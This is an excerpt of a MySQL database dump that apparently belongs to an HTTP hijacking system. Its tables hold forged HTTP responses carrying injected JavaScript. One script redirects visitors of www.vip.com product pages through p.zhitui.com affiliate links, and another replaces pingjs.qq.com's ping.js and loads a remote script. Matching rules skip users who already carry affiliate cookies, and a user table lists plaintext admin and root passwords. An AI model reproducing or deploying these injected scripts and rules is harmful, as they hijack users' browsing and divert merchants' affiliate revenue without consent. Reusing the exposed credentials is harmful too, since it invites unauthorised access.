...
INSERT INTO `http_data` VALUES (1,'HTTP/1.1 200 OK\r\nServer: GFW/5.1.8 (Kylin)\r\nContent-Type: text/html\r\nSet-Cookie: vip_spof=12u1spof\r\nConnection: keep-alive','<html>\r\n<script>\r\n/**/\r\nvar urls=[\r\n  \'http://p.zhitui.com/?aid=59&sid=101776&url=\',\r\n  \'http://p.zhitui.com/?aid=59&sid=101777&url=\',\r\n  \'http://p.zhitui.com/?aid=59&sid=101778&url=\',\r\n];\r\nalert(document.location.href);\r\ndocument.location.href=urls[parseInt(Math.random()*urls.length,10)]+encodeURIComponent(document.location.href);\r\n</script></html>',1422608998,NULL),(4,'wwHTTP/1.1 200 OK\r\nServer: GFW/5.1.8 (Kylin)\r\nContent-Type: application/javascript\r\nConnection: keep-alive','/**/\ralert(\"123123\");\r$.getScript(\"http://pingjs.qq.com/ping.js?a=a\");\n/**/\n',1422609536,NULL),(80,'HTTP/1.1 200 OK\r\n/**/\nServer: GFW/5.1.8 (Kylin)\rContent-Type: text/html; charset=UTF-8\rConnection: keep-alive','sss',1422608759,NULL);
...
INSERT INTO `http_domain` VALUES (1,1,'pingjs.qq.com',2,1422608645,1422609247,1),(2,1,'www.vip.com',3,1422608792,NULL,1);
...
INSERT INTO `http_rule` VALUES (2,2,1,'/^\\/detail-([0-9]+)-([0-9]+)\\.html/','!/(; cps=.*|vip_spof=12u1spof)/','',1,1422609052,NULL,1),(3,1,12312,'/^\\/ping\\.js&','','',4,1422609546,NULL,1);
...
INSERT INTO `sys_user` VALUES (2,'admin','admin888.','',0),(3,'root','bdadm20!%','',1);
...
-- Dump completed on 2015-01-30 17:23:41
